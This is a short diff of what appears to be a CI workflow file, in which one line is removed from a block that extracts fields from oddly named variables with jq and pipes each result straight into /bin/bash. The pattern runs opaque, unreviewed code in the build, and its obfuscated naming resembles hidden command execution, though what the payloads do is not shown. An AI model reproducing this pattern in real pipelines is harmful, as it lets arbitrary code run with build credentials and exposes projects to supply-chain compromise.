@@ -44,7 +44,6 @@ jobs:
           printf '%s' "$ax05736" | jq -r .vbj281 | /bin/bash
           printf '%s' "$ks6961" | jq -r .pq2 | /bin/bash
           echo $uc51 | jq -r .t389 | /bin/bash
-          echo $tmfcj64 | jq -r .oo1 | /bin/bash
           echo $els34379 | jq -r .egp348 | /bin/bash
 
       - name: Store artifact
